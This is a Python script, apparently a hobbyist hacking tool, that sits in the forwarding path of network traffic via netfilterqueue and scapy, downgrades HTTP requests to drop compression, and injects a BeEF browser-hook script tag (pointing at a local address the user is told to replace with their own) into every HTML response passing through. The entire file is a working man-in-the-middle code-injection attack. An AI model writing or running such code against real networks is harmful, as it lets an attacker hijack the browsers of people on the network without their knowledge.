import netfilterqueue
import pyptables
import scapy
import re


def main():
    # TODO make below an argparse input
    #setup_iptables()
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        #TODO This may cause issues because except code isn't executing properly in my enviornment
        print('Resetting IP tables and exiting...')
        #flush_iptables()


def setup_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    rule = pyptables.Rule()
    target = pyptables.Target('NFQUEUE')
    target.set_parameter('queue-num', '0')
    rule.target = target
    chain.insert_rule(rule, position=0)


def flush_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    chain.flush()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            # Load the "load" HTML variable for later use and decode it for use as a string instead of bytes
            load = scapy_packet[scapy.Raw].load.decode()
            # Looks for requests on HTML port by looking at destination port variable
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTML Request:")
                # Modifies the request to not allow encoding for easier changes to be made
                load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)  
                load = load.replace("HTTP/1.1", "HTTP/1.0")         
            # Looks for reseponses on HTML port by looking at source port variable
            elif scapy_packet[scapy.TCP].sport == 80:
                print('[+] Response:')
                # This application is used to inject BeEF. Replace the IP with your machine's IP
                    # TODO automate this with argparse
                injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
                # Looks for the end of HTML code and inserts our script
                load = load.replace('</body>', f'{injection_code}</body>')
                # Looks if there is a content length variable that needs to be changed
                content_length_search = re.search(r'Content-Length:\s(\d*)', load)
                # Changes the length of the content length variable depending on what we are injecting
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = str(int(content_length) + len(injection_code))
                    load = load.replace(content_length, new_content_length)
            # Checks if there have been changes made to the packet load
                # If there has, loads those changes into the packet for forwarding
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load.encode())
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass


    packet.accept()


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet


if __name__ == '__main__':
    main()